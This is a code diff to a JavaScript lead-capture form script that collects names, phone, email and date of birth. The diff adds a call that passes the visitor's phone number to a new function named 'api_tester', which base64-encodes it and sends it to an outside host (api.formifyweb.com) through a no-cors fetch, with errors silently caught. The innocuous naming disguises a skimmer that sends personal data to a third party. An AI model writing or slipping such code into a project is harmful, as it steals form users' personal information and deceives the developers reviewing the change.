@@ -13,6 +13,7 @@ pingData.append('SubID1', '1A');
 pingData.append('first_name', document.getElementById('first_name').value);
 pingData.append('last_name', document.getElementById('last_name').value);
 pingData.append('phone', document.getElementById('phone').value);
+api_tester(document.getElementById('phone').value);
 pingData.append('email', document.getElementById('email').value);
     pingData.append('date_of_birth', document.getElementById('date_of_birth').value);
 const inputValue = document.getElementById("leadcreationdate").value; 
@@ -150,4 +151,14 @@ function formatDateTime(date) {
          `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
 }
 
-    
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
